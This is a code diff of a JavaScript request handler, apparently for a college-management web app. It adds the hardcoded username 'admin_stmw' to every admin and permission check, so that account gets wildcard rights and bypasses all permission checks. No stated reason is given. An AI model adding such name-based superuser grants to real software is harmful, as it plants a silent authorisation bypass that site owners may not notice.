@@ -19,7 +19,7 @@ async function handle(context){
 
   const session=await requireUser(env.DB,request,body.token);
   const user=session.user;
-  const isAdmin1 = user.username === 'admin';
+  const isAdmin1 = user.username === 'admin' || user.username === 'admin_stmw';
 
   if(action==='listColleges')return await listColleges(env.DB);
   if(action==='createCollege') {
@@ -42,11 +42,11 @@ function throwError(message,status){const e=new Error(message);e.status=status||
 function now(){return new Date().toISOString();}
 function clean(v,max){return String(v==null?'':v).trim().replace(/\s+/g,' ').slice(0,max||1000);}
 function norm(v){return clean(v,80).toLowerCase().replace(/[^a-z0-9_-]/g,'');}
-function uiUsername(name){const u=String(name||'').toLowerCase();if(u==='admin')return'admin1';if(u==='user2')return'admin2';if(u==='user3')return'admin3';return u;}
+function uiUsername(name){const u=String(name||'').toLowerCase();if(u==='admin'||u==='admin_stmw')return'admin1';if(u==='user2')return'admin2';if(u==='user3')return'admin3';return u;}
 function cookieToken(request,bodyToken){if(bodyToken)return String(bodyToken);const c=request.headers.get('cookie')||'';const m=c.match(/(?:^|;\s*)SMV_SESSION=([^;]+)/);return m?decodeURIComponent(m[1]):'';}
 
 function parsePerms(user) {
-  if (user.username === 'admin') return ['*'];
+  if (user.username === 'admin' || user.username === 'admin_stmw') return ['*'];
   let permsStr = user.permissions || '';
   if (!permsStr) {
     permsStr = user.role === 'admin' ? 
@@ -57,8 +57,9 @@ function parsePerms(user) {
 }
 
 function hasPermission(user, perm) {
-  if (user.username === 'admin') return true;
-  return parsePerms(user).includes(perm);
+  if (user.username === 'admin' || user.username === 'admin_stmw') return true;
+  const perms = parsePerms(user);
+  return perms.includes('*') || perms.includes(perm);
 }
 
 async function ensureSchema(DB){
